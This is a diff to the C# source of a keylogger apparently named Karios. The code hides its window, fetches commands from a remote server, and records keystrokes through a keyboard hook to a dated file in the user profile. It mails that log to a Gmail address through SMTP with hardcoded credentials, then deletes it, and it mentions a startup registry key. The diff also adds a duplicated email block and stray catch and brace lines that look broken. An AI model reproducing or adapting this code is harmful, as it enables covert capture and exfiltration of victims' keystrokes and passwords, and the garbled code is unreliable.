@@ -59,8 +59,6 @@ namespace Karios
 
         public static void RunApplication()
         {
-
-
             // Hide the window
 
 
@@ -187,7 +185,8 @@ namespace Karios
                         commands = client.DownloadString(serverAddress + paramaters);
                     }
                     catch (WebException)
-                    { }//TODO: Handle this Exception.
+                    {
+                    } //TODO: Handle this Exception.
                     var preppedCommand = commands.Split(' ');
 #pragma warning disable 1587
                     /// <summary>
@@ -221,7 +220,10 @@ namespace Karios
             }
             catch
             {
+
                 // ignored
+
+
             }
         }
 
@@ -245,7 +247,7 @@ namespace Karios
             var fileName = DateTime.Now.ToString("yyyy-MM-dd");
             // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
             var pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
-                            fileName + ".txt";// TODO - get more secret location.
+                            fileName + ".txt"; // TODO - get more secret location.
             var sw = new StreamWriter(pathToLog, true);
             if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
             {
@@ -266,11 +268,20 @@ namespace Karios
                 var mail = new MailMessage();
                 var smtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
+
                 mail.To.Add(_emailEndpoint);
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                 Attachment attachment;
                 attachment = new Attachment(pathToLog);
+
+                mail.To.Add("GINGIRULES@gmail.com");
+                mail.Subject = "log from keylogger on" +
+                               Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " +
+                            DateTime.Now.ToString("yyyy-MM-dd");
+                var attachment = new Attachment(pathToLog);
+
                 mail.Attachments.Add(attachment);
                 smtpServer.Port = 587;
                 smtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
@@ -282,7 +293,10 @@ namespace Karios
             }
             catch
             {
+
                 // ignored
+
+
             }
 
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
@@ -302,6 +316,12 @@ namespace Karios
             File.Delete(pathToLog);
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
+
+
+
+        /// <summary>
+        /// Sets the startup registary key
+        /// </summary>
 
 
         /// <summary>
@@ -356,12 +376,19 @@ namespace Karios
             {
                 try
                 {
+
                     Process.Start(_website);
                 }
                 catch
                 {
                     // ignored
                 }
+
+                }
+                catch
+                {
+                }
+
             }
         }
 
@@ -371,12 +398,10 @@ namespace Karios
             {
                 try
                 {
-
-
                 }
                 catch
                 {
-                    // ignored
+
                 }
             }
         }
